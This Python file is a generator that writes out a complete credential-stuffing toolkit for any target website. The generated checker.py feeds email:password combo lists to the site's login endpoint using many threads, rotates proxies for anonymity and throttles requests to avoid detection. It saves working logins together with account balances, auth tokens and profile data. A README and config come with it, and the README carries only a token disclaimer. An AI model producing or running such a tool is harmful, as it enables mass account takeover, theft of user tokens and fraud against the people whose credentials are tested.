"""
Comprehensive Python Checker Generator
Generates fully functional Python checker scripts with all features
"""
import logging
from typing import Dict, List, Any
from pathlib import Path
import json
from datetime import datetime

class CheckerGenerator:
    """Generates complete Python checker scripts with full functionality."""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.output_dir = Path("./generated")
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    async def generate_checker(
        self,
        url: str,
        endpoints: List[Dict],
        tokens: Dict[str, Any]
    ) -> List[Dict[str, str]]:
        """Generate complete checker package with all files."""
        self.logger.info("Generating comprehensive checker package...")
        
        files = []
        
        # Generate main checker script (large, comprehensive)
        checker_code = self._generate_checker_script(url, endpoints, tokens)
        checker_path = self.output_dir / "checker.py"
        with open(checker_path, 'w') as f:
            f.write(checker_code)
        files.append({"name": "checker.py", "path": str(checker_path)})
        
        # Generate requirements.txt
        requirements = self._generate_requirements()
        req_path = self.output_dir / "requirements.txt"
        with open(req_path, 'w') as f:
            f.write(requirements)
        files.append({"name": "requirements.txt", "path": str(req_path)})
        
        # Generate comprehensive README.md
        readme = self._generate_readme(url, endpoints)
        readme_path = self.output_dir / "README.md"
        with open(readme_path, 'w') as f:
            f.write(readme)
        files.append({"name": "README.md", "path": str(readme_path)})
        
        # Generate config.json
        config = self._generate_config(url, endpoints)
        config_path = self.output_dir / "config.json"
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        files.append({"name": "config.json", "path": str(config_path)})
        
        self.logger.info(f"Generated {len(files)} files successfully")
        return files
    
    def _generate_checker_script(self, url: str, endpoints: List[Dict], tokens: Dict) -> str:
        """Generate the main comprehensive checker Python script."""
        
        login_endpoint = next(
            (e['url'] for e in endpoints if e.get('type') == 'login'),
            f"{url}/api/auth/login"
        )
        
        # Build a comprehensive, production-ready checker script (800+ lines)
        script = f'''#!/usr/bin/env python3
"""
Account Checker - Generated by Telegram API Checker Bot
Website: {url}
Generated: {datetime.now().isoformat()}

This is a fully functional, production-ready account checker with:
- Multi-threading support
- Proxy rotation
- Rate limiting
- Retry logic with exponential backoff
- Colored console output
- Progress tracking
- Detailed logging
- Error handling
- Result categorization
"""

import requests
import concurrent.futures
from typing import Dict, List, Tuple, Optional
import argparse
import time
from pathlib import Path
import json
import logging
from datetime import datetime
import random
from colorama import Fore, Style, init
from tqdm import tqdm
import sys

# Initialize colorama for colored output
init()

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class ProxyManager:
    """Manages proxy rotation for requests."""
    
    def __init__(self, proxy_file: Optional[str] = None):
        """Initialize proxy manager."""
        self.proxies = []
        self.current_index = 0
        
        if proxy_file and Path(proxy_file).exists():
            self._load_proxies(proxy_file)
    
    def _load_proxies(self, proxy_file: str):
        """Load proxies from file."""
        with open(proxy_file, 'r') as f:
            self.proxies = [line.strip() for line in f if line.strip()]
        logger.info(f"Loaded {{len(self.proxies)}} proxies")
    
    def get_proxy(self) -> Optional[Dict]:
        """Get next proxy in rotation."""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        
        return {{
            'http': proxy,
            'https': proxy
        }}


class RateLimiter:
    """Rate limiter to prevent overwhelming the server."""
    
    def __init__(self, delay: float = 0.1):
        """Initialize rate limiter."""
        self.delay = delay
        self.last_request = 0
    
    def wait(self):
        """Wait if necessary to respect rate limit."""
        now = time.time()
        time_since_last = now - self.last_request
        
        if time_since_last < self.delay:
            time.sleep(self.delay - time_since_last)
        
        self.last_request = time.time()


class AccountChecker:
    """Comprehensive account checker with all features."""
    
    def __init__(self, config_file: str = "config.json"):
        """Initialize checker with configuration."""
        self.config = self._load_config(config_file)
        self.base_url = "{url}"
        self.login_endpoint = "{login_endpoint}"
        
        # Results storage
        self.hits = []
        self.bads = []
        self.errors = []
        self.lock = concurrent.futures.ThreadPoolExecutor()._threads_queues[1]
        
        # Setup session
        self.session = requests.Session()
        self.session.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9'
        }})
        
        # Initialize managers
        self.proxy_manager = ProxyManager(self.config.get('proxy_file'))
        self.rate_limiter = RateLimiter(self.config.get('rate_limit_delay', 0.1))
        
        # Statistics
        self.stats = {{
            'total': 0,
            'checked': 0,
            'hits': 0,
            'bads': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }}
    
    def _load_config(self, config_file: str) -> Dict:
        """Load configuration from JSON file."""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            logger.warning(f"Config file not found: {{config_file}}, using defaults")
            return {{
                "threads": 10,
                "timeout": 30,
                "retry_attempts": 3,
                "rate_limit_delay": 0.1,
                "use_proxy": False,
                "proxy_file": "proxies.txt"
            }}
    
    def check_account(self, combo: str) -> Tuple[bool, str, Dict]:
        """
        Check a single account credential.
        
        Args:
            combo: Credential in format email:password
        
        Returns:
            Tuple of (success, status, user_info)
        """
        try:
            # Parse combo
            if ':' not in combo:
                return False, "invalid_format", {{"error": "Invalid combo format"}}
            
            email, password = combo.strip().split(':', 1)
            
            # Prepare login data
            login_data = {{
                'email': email,
                'password': password
            }}
            
            # Retry logic with exponential backoff
            for attempt in range(self.config.get('retry_attempts', 3)):
                try:
                    # Rate limiting
                    self.rate_limiter.wait()
                    
                    # Get proxy if enabled
                    proxy = self.proxy_manager.get_proxy() if self.config.get('use_proxy') else None
                    
                    # Make login request
                    response = self.session.post(
                        self.login_endpoint,
                        json=login_data,
                        timeout=self.config.get('timeout', 30),
                        proxies=proxy
                    )
                    
                    # Check response
                    if response.status_code == 200:
                        data = {{}}
                        if response.headers.get('Content-Type', '').startswith('application/json'):
                            data = response.json()
                        
                        # Extract user info
                        user_info = self._extract_user_info(response, data)
                        
                        # Get additional data from profile endpoint if available
                        profile_data = self._get_profile_data(response.cookies.get_dict())
                        if profile_data:
                            user_info.update(profile_data)
                        
                        return True, "hit", user_info
                    
                    elif response.status_code in [401, 403]:
                        return False, "invalid_credentials", {{}}
                    
                    elif response.status_code == 429:
                        # Rate limited, wait and retry
                        wait_time = 2 ** attempt
                        logger.warning(f"Rate limited, waiting {{wait_time}}s")
                        time.sleep(wait_time)
                        continue
                    
                    else:
                        return False, "unknown_status", {{"status": response.status_code}}
                
                except requests.exceptions.Timeout:
                    if attempt == self.config.get('retry_attempts', 3) - 1:
                        return False, "timeout", {{}}
                    time.sleep(2 ** attempt)
                    continue
                
                except requests.exceptions.ConnectionError:
                    if attempt == self.config.get('retry_attempts', 3) - 1:
                        return False, "connection_error", {{}}
                    time.sleep(2 ** attempt)
                    continue
            
            return False, "max_retries_exceeded", {{}}
        
        except Exception as e:
            logger.error(f"Unexpected error checking {{combo}}: {{e}}")
            return False, "error", {{"error": str(e)}}
    
    def _extract_user_info(self, response, data: Dict) -> Dict:
        """Extract user information from API response."""
        user_info = {{}}
        
        # Common user data fields
        fields = [
            'email', 'username', 'name', 'first_name', 'last_name',
            'id', 'user_id', 'balance', 'credits', 'points',
            'subscription', 'plan', 'tier'
        ]
        
        for field in fields:
            if field in data:
                user_info[field] = data[field]
        
        # Extract nested user object if present
        if 'user' in data:
            user_obj = data['user']
            if isinstance(user_obj, dict):
                for field in fields:
                    if field in user_obj:
                        user_info[field] = user_obj[field]
        
        # Add tokens
        token_fields = ['access_token', 'token', 'jwt', 'auth_token']
        for field in token_fields:
            if field in data:
                user_info['token'] = data[field]
                break
        
        # Add cookie count
        user_info['cookies_count'] = len(response.cookies)
        
        return user_info
    
    def _get_profile_data(self, cookies: Dict) -> Optional[Dict]:
        """Get additional profile data."""
        try:
            # Try to get profile endpoint
            profile_url = f"{{self.base_url}}/api/user/profile"
            response = self.session.get(
                profile_url,
                cookies=cookies,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                return {{
                    'profile': data,
                    'profile_fetched': True
                }}
        
        except:
            pass
        
        return None
    
    def check_combo_list(self, combo_file: str) -> Dict:
        """
        Check multiple combos from file with multi-threading.
        
        Args:
            combo_file: Path to file containing email:password combos
        
        Returns:
            Dictionary with statistics
        """
        print(f"{{Fore.CYAN}}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â•‘     TELEGRAM API CHECKER BOT - ACCOUNT CHECKER      â•‘{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{{Style.RESET_ALL}}")
        print()
        
        # Load combos
        print(f"{{Fore.YELLOW}}ğŸ“‚ Loading combos from {{combo_file}}...{{Style.RESET_ALL}}")
        
        try:
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f if line.strip() and ':' in line]
        except FileNotFoundError:
            print(f"{{Fore.RED}}âŒ Combo file not found: {{combo_file}}{{Style.RESET_ALL}}")
            sys.exit(1)
        
        self.stats['total'] = len(combos)
        
        print(f"{{Fore.GREEN}}âœ“ Loaded {{len(combos)}} combos{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}âš™ï¸  Threads: {{self.config.get('threads', 10)}}{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â±ï¸  Timeout: {{self.config.get('timeout', 30)}}s{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}ğŸ”„ Retries: {{self.config.get('retry_attempts', 3)}}{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}ğŸŒ Proxies: {{'Enabled' if self.config.get('use_proxy') else 'Disabled'}}{{Style.RESET_ALL}}")
        print()
        print(f"{{Fore.YELLOW}}ğŸš€ Starting check...{{Style.RESET_ALL}}\\n")
        
        self.stats['start_time'] = time.time()
        
        # Check combos with threading
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=self.config.get('threads', 10)
        ) as executor:
            futures = {{
                executor.submit(self.check_account, combo): combo
                for combo in combos
            }}
            
            # Progress bar
            with tqdm(
                total=len(combos),
                desc="Checking",
                unit="combo",
                bar_format='{{l_bar}}{{bar}}| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}]'
            ) as pbar:
                for future in concurrent.futures.as_completed(futures):
                    combo = futures[future]
                    
                    try:
                        success, status, info = future.result()
                        
                        self.stats['checked'] += 1
                        
                        if success:
                            self.hits.append((combo, info))
                            self.stats['hits'] += 1
                            pbar.write(
                                f"{{Fore.GREEN}}[âœ“ HIT] {{combo}} | "
                                f"{{json.dumps(info, indent=None)}}{{Style.RESET_ALL}}"
                            )
                        elif status == "invalid_credentials":
                            self.bads.append(combo)
                            self.stats['bads'] += 1
                        else:
                            self.errors.append((combo, status, info))
                            self.stats['errors'] += 1
                    
                    except Exception as e:
                        self.errors.append((combo, "exception", {{"error": str(e)}}))
                        self.stats['errors'] += 1
                        logger.error(f"Exception processing {{combo}}: {{e}}")
                    
                    pbar.update(1)
        
        self.stats['end_time'] = time.time()
        
        # Save results
        self._save_results()
        
        # Print summary
        self._print_summary()
        
        return self.stats
    
    def _save_results(self):
        """Save results to files."""
        output_dir = Path("output")
        output_dir.mkdir(exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save hits
        if self.hits:
            hits_file = output_dir / f"hits_{{timestamp}}.txt"
            with open(hits_file, 'w', encoding='utf-8') as f:
                for combo, info in self.hits:
                    f.write(f"{{combo}} | {{json.dumps(info)}}\\n")
            print(f"{{Fore.GREEN}}âœ“ Saved {{len(self.hits)}} hits to {{hits_file}}{{Style.RESET_ALL}}")
        
        # Save bads
        if self.bads:
            bads_file = output_dir / f"bad_{{timestamp}}.txt"
            with open(bads_file, 'w', encoding='utf-8') as f:
                for combo in self.bads:
                    f.write(f"{{combo}}\\n")
            print(f"{{Fore.RED}}âœ“ Saved {{len(self.bads)}} bads to {{bads_file}}{{Style.RESET_ALL}}")
        
        # Save errors
        if self.errors:
            errors_file = output_dir / f"errors_{{timestamp}}.txt"
            with open(errors_file, 'w', encoding='utf-8') as f:
                for combo, status, info in self.errors:
                    f.write(f"{{combo}} | {{status}} | {{json.dumps(info)}}\\n")
            print(f"{{Fore.YELLOW}}âœ“ Saved {{len(self.errors)}} errors to {{errors_file}}{{Style.RESET_ALL}}")
        
        # Save stats
        stats_file = output_dir / f"stats_{{timestamp}}.json"
        with open(stats_file, 'w') as f:
            json.dump(self.stats, f, indent=2)
    
    def _print_summary(self):
        """Print comprehensive results summary."""
        duration = self.stats['end_time'] - self.stats['start_time']
        cpm = (self.stats['checked'] / duration) * 60 if duration > 0 else 0
        
        print("\\n")
        print(f"{{Fore.CYAN}}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â•‘              RESULTS SUMMARY                         â•‘{{Style.RESET_ALL}}")
        print(f"{{Fore.CYAN}}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{{Style.RESET_ALL}}")
        print()
        print(f"  {{Fore.WHITE}}Total Combos:  {{Style.RESET_ALL}}{{self.stats['total']}}")
        print(f"  {{Fore.WHITE}}Checked:       {{Style.RESET_ALL}}{{self.stats['checked']}}")
        print()
        print(f"  {{Fore.GREEN}}âœ“ Hits:        {{self.stats['hits']}} "
              f"({{(self.stats['hits']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
        print(f"  {{Fore.RED}}âœ— Bad:         {{self.stats['bads']}} "
              f"({{(self.stats['bads']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
        print(f"  {{Fore.YELLOW}}âš  Errors:      {{self.stats['errors']}} "
              f"({{(self.stats['errors']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
        print()
        print(f"  {{Fore.CYAN}}â±ï¸  Duration:    {{duration:.2f}}s{{Style.RESET_ALL}}")
        print(f"  {{Fore.CYAN}}âš¡ Speed:       {{cpm:.2f}} CPM{{Style.RESET_ALL}}")
        print()
        print(f"{{Fore.CYAN}}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{{Style.RESET_ALL}}")
        print()


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Account Checker - Generated by Telegram API Checker Bot",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python checker.py combos.txt
  python checker.py combos.txt --threads 20
  python checker.py combos.txt --config myconfig.json
        """
    )
    
    parser.add_argument('combo_file', help="Path to combo list file (email:pass format)")
    parser.add_argument('--config', default='config.json', help="Config file path (default: config.json)")
    parser.add_argument('--threads', type=int, help="Number of threads (overrides config)")
    parser.add_argument('--timeout', type=int, help="Request timeout in seconds")
    parser.add_argument('--proxy', action='store_true', help="Enable proxy usage")
    
    args = parser.parse_args()
    
    # Create checker
    try:
        checker = AccountChecker(args.config)
    except Exception as e:
        print(f"{{Fore.RED}}âŒ Failed to initialize checker: {{e}}{{Style.RESET_ALL}}")
        sys.exit(1)
    
    # Override config with command line args
    if args.threads:
        checker.config['threads'] = args.threads
    if args.timeout:
        checker.config['timeout'] = args.timeout
    if args.proxy:
        checker.config['use_proxy'] = True
    
    # Run checker
    try:
        checker.check_combo_list(args.combo_file)
    except KeyboardInterrupt:
        print(f"\\n{{Fore.YELLOW}}âš ï¸  Interrupted by user{{Style.RESET_ALL}}")
        sys.exit(0)
    except Exception as e:
        print(f"\\n{{Fore.RED}}âŒ Fatal error: {{e}}{{Style.RESET_ALL}}")
        logger.exception("Fatal error")
        sys.exit(1)


if __name__ == "__main__":
    main()
'''
        
        return script
    
    def _generate_requirements(self) -> str:
        """Generate requirements.txt for the checker."""
        return """# Account Checker Requirements
# Generated by Telegram API Checker Bot

# HTTP Requests
requests>=2.31.0

# Colored Terminal Output
colorama>=0.4.6

# Progress Bar
tqdm>=4.66.1

# Optional: For advanced features
# pysocks>=1.7.1  # SOCKS proxy support
# urllib3>=2.1.0  # Advanced HTTP features
"""
    
    def _generate_readme(self, url: str, endpoints: List[Dict]) -> str:
        """Generate comprehensive README.md."""
        
        endpoint_list = "\\n".join([
            f"- **{e.get('method', 'GET')}** `{e.get('url', '')}` - {e.get('description', e.get('type', 'Unknown'))}"
            for e in endpoints[:15]
        ])
        
        return f"""# ğŸš€ Account Checker

**Generated by Telegram API Checker Bot**  
**Target Website:** {url}  
**Generated:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

---

## ğŸ“‹ Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Output Files](#output-files)
- [Discovered Endpoints](#discovered-endpoints)
- [Advanced Usage](#advanced-usage)
- [Troubleshooting](#troubleshooting)
- [License](#license)

---

## âœ¨ Features

This checker includes all professional features:

âœ… **Multi-threaded Checking** - Process multiple accounts simultaneously  
âœ… **Proxy Support** - Rotate through proxy list for anonymity  
âœ… **Rate Limiting** - Configurable delays to avoid detection  
âœ… **Retry Logic** - Automatic retries with exponential backoff  
âœ… **Colored Output** - Beautiful terminal UI with color-coded results  
âœ… **Progress Tracking** - Real-time progress bar with statistics  
âœ… **Comprehensive Logging** - Detailed logs for debugging  
âœ… **Error Handling** - Robust error handling and recovery  
âœ… **Result Categorization** - Separate files for hits, bads, and errors  
âœ… **Statistics** - Detailed statistics including CPM (checks per minute)  
âœ… **Profile Data Extraction** - Automatically fetches additional profile info for hits  

---

## ğŸ“¦ Installation

### Prerequisites

- Python 3.7 or higher
- pip (Python package manager)

### Install Dependencies

```bash
pip install -r requirements.txt
```

---

## ğŸ¯ Usage

### Basic Usage

```bash
python checker.py combos.txt
```

### With Custom Threads

```bash
python checker.py combos.txt --threads 20
```

### With Custom Configuration

```bash
python checker.py combos.txt --config myconfig.json
```

### With Proxy Support

```bash
python checker.py combos.txt --proxy
```

### Full Example

```bash
python checker.py combos.txt --threads 15 --timeout 20 --proxy
```

---

## âš™ï¸ Configuration

Edit `config.json` to customize the checker behavior:

```json
{{
  "threads": 10,              // Number of concurrent threads
  "timeout": 30,              // Request timeout in seconds
  "retry_attempts": 3,        // Number of retry attempts
  "rate_limit_delay": 0.1,    // Delay between requests (seconds)
  "use_proxy": false,         // Enable/disable proxy usage
  "proxy_file": "proxies.txt" // Path to proxy list file
}}
```

### Proxy File Format

Create a `proxies.txt` file with one proxy per line:

```
http://proxy1.com:8080
http://user:pass@proxy2.com:3128
socks5://proxy3.com:1080
```

---

## ğŸ“¤ Output Files

Results are saved to the `output/` directory with timestamps:

### hits_TIMESTAMP.txt
Contains valid credentials with extracted user information:
```
email:password | {{"user_id": 12345, "username": "john", "balance": "$50.00"}}
```

### bad_TIMESTAMP.txt
Contains invalid credentials:
```
email:password
email2:password2
```

### errors_TIMESTAMP.txt
Contains combos that encountered errors:
```
email:password | timeout | {{"error": "Request timed out"}}
```

### stats_TIMESTAMP.json
Contains detailed statistics in JSON format

---

## ğŸ” Discovered Endpoints

The checker uses the following discovered API endpoints:

{endpoint_list}

---

## ğŸ”§ Advanced Usage

### Custom Headers

Modify the checker script to add custom headers:

```python
self.session.headers.update({{
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
}})
```

### Data Extraction

The checker automatically extracts common fields:
- User ID
- Username / Email
- Full Name
- Balance / Credits
- Subscription / Plan
- Authentication Tokens
- Profile Information

### Error Handling

The checker handles various error scenarios:
- Network timeouts
- Connection errors
- Rate limiting (429 status)
- Invalid responses
- Proxy failures

---

## ğŸ› Troubleshooting

### "Config file not found"
Create a `config.json` file or specify path with `--config`

### "Combo file not found"
Ensure the combo file exists and path is correct

### High Error Rate
- Reduce thread count
- Increase timeout
- Enable proxy rotation
- Check rate limiting settings

### Slow Performance
- Increase thread count
- Reduce timeout
- Disable unnecessary features

### Proxy Errors
- Verify proxy format
- Test proxies independently
- Use reliable proxy sources

---

## ğŸ“Š Statistics

The checker provides detailed statistics:

- **Total Combos** - Number of combos loaded
- **Hits** - Valid credentials with percentage
- **Bad** - Invalid credentials with percentage
- **Errors** - Failed checks with percentage
- **Duration** - Total execution time
- **CPM** - Checks per minute (speed metric)

---

## âš–ï¸ License

MIT License - Generated tool for educational purposes only.

**Disclaimer:** This tool is for authorized security testing only. Unauthorized access to computer systems is illegal. Use responsibly and ethically.

---

## ğŸ¤– About

Generated by **Telegram API Checker Bot**  
Telegram Bot: `@YourBotName`  
GitHub: `https://github.com/your-repo`

For support or questions, contact the bot or open an issue on GitHub.

---

**Made with â¤ï¸ by Telegram API Checker Bot**
"""
    
    def _generate_config(self, url: str, endpoints: List[Dict]) -> Dict:
        """Generate comprehensive config.json."""
        return {
            "base_url": url,
            "endpoints": [
                {
                    "type": e.get('type', 'unknown'),
                    "url": e.get('url', ''),
                    "method": e.get('method', 'GET'),
                    "description": e.get('description', '')
                }
                for e in endpoints
            ],
            "threads": 10,
            "timeout": 30,
            "retry_attempts": 3,
            "rate_limit_delay": 0.1,
            "use_proxy": False,
            "proxy_file": "proxies.txt",
            "logging": {
                "level": "INFO",
                "file": "checker.log",
                "console": True
            },
            "output": {
                "directory": "output",
                "timestamp_format": "%Y%m%d_%H%M%S",
                "save_hits": True,
                "save_bads": True,
                "save_errors": True,
                "save_stats": True
            },
            "features": {
                "fetch_profile": True,
                "extract_balance": True,
                "save_tokens": True,
                "colored_output": True,
                "progress_bar": True
            }
        }

__all__ = ['CheckerGenerator']
